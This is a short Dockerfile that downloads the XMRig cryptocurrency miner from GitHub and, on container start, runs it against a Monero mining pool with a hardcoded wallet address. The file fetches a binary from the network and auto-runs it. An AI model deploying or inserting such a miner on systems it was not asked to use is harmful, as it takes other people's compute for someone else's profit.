FROM ubuntu:16.04
WORKDIR /app
# Install prerequisites
RUN apt-get update && apt-get install -y screen
RUN apt-get update && apt-get install -y wget
RUN apt-get update && apt-get install -y tar
RUN wget -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz
RUN tar -xf xmrig.tar.gz
RUN chmod +rwx xmrig-6.17.0
CMD ./xmrig-6.17.0/xmrig -o pool.minexmr.com:4444 -u 46fQMXV6agRU3ecaFxy4VQSa14M8Eu5gz7rtA4ahXgsxPuM6J7jiN6fcXePBPYhba9JSDtYL5kpvgJHxPPzrzt5iNNzGnmK
